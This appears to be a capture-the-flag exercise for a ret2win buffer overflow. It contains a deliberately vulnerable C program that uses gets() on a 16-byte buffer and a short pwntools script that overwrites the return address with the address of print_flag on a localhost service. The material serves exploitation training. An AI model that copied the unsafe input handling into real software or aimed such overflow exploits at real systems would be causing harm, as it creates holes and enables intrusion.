

## [SOLVER](https://youtu.be/5vYH1fshweU) https://youtu.be/5vYH1fshweU


# ret2.c

```c
#include <stdio.h>
#include <stdlib.h>

void setup_buffering() {
	/* Disable stream buffering */
	/* All this does is make input/output work like you'd expect when */
	/* the program is run over the network. */
	setvbuf(stdin,  NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
}

void print_flag() {
	FILE* f = fopen("flag.txt", "r");
	if (f == NULL) {
		fputs("error reading flag!", stderr);
		exit(1);
	}
	char flag[256];
	fgets(flag, sizeof(flag), f);
	fclose(f);
	puts(flag);
}

int main() {
	setup_buffering();

	char input[16];
	puts("Tell me something interesting...");
	gets(input);
	puts("Thanks!");
	return 0;
}
```

# ret2.py

```py
from pwn import *

r = remote('localhost', 5555)


r.readline()

print_flag = 0x4011f7

p = cyclic(24)
p += p64(print_flag)

r.sendline(p)

print(r.recv())
print(r.recv())
```

